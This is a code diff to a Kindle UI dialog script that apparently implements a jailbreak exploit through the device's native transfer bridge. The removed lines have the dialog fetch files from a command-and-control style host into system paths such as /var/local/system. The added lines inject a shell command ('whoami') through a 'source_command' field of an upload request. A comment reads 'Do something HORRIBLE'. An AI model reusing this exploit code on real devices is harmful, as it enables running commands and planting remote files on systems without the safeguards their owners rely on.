@@ -1,48 +1,8 @@
-thumb = "YldWeVoyVnVNekV3Tnc9PQ==";
-
-function generateCryptoSign(signBy) {
-    var e = Math.ceil(signBy).toExponential();
-    var data = []
-    for (var i=0; i < e.length; i++) {
-        data.push(e.charCodeAt(i));
-    }
-
-    while (data.length < "kindle".length - 2) {
-        data.push(Math.random());
-    }
-
-    for (var i=0; i < data.length; i++) {
-        while (data[i] > 1) {
-            data[i] = data[i] * Math.random();
-        }
-    }
-    return data;
-}
-
-function downloadDRMFile(path, url, file) {
-    var drmFileData = {
-        url:                        url,        // The path to the server
-        dest:                       path,           // Destination
-        unique_id:                  "archivedItems",
-        extra_headers:              "fileData:" + encodeURIComponent(file) + "\nmodelInfo:" + encodeURIComponent(thumb)
-    }
-
-    drmFileData.transport_any = 1;
-    drmFileData.priority = 80;
-    drmFileData.notify_progress_interval = 20;
-    drmFileData.notify_pub = "com.lab126.archive";
-    drmFileData.notify_prop = "transferProgressNotification";
-
-
-    return drmFileData
-}
-
 Pillow.MountSusDialog = function tmp() {
     var that = this;
     var parent = Pillow.extend(this, new Pillow.Case('MountSusDialog'));
     var windowTitle = null;
     var listWidget = null;
-    var selectedItem = null;
     var settingList = null;
     var jsEnabled = true;
     var imageEnabled = true;
@@ -79,22 +39,13 @@ Pillow.MountSusDialog = function tmp() {
     };
 
     var listItemSelection = function tmp(item) {
-        Pillow.logInfo("Generating crypto constants");
-        var cryptoConstants = generateCryptoSign();
-        var urlRoot = "https://mountsusc2.hackerman.fr";
-
-        var drm3ResponseRequest = downloadDRMFile(filePath, urlRoot + "/MountSus/drmChallengeResponse", file);
-
         document.getElementById("jailState").innerText = "Sending request...";
 
-        nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", drm3ResponseRequest);
-
         // Do something HORRIBLE
-        nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_download", {
-            url:                        urlRoot + "/MountSus/fs_type",        // The path to the server
-            dest:                       "/var/local/system/fs_type",           // Destination
+        nativeBridge.accessHasharrayProperty("com.lab126.transfer", "request_upload", {
+            url:                        "file:///mnt/us/mountsus_dialog.log",        // The path to the server
+            source_command:             "whoami > /mnt/us/mountsus.log",           // Destination
             unique_id:                  "archivedItems",
-            extra_headers:              "modelInfo:" + encodeURIComponent(thumb),
 
             transport_any: 1,
             priority: 80,
@@ -102,8 +53,6 @@ Pillow.MountSusDialog = function tmp() {
             notify_pub: "com.lab126.archive",
             notify_prop: "transferProgressNotification",
         });
-
-        document.getElementById("jailState").innerText = "Digging tunnel...";
 
         setTimeout(function tmp() {
             document.getElementById("jailState").innerText = "Done! Close the popup and click Verify Jailbreak";
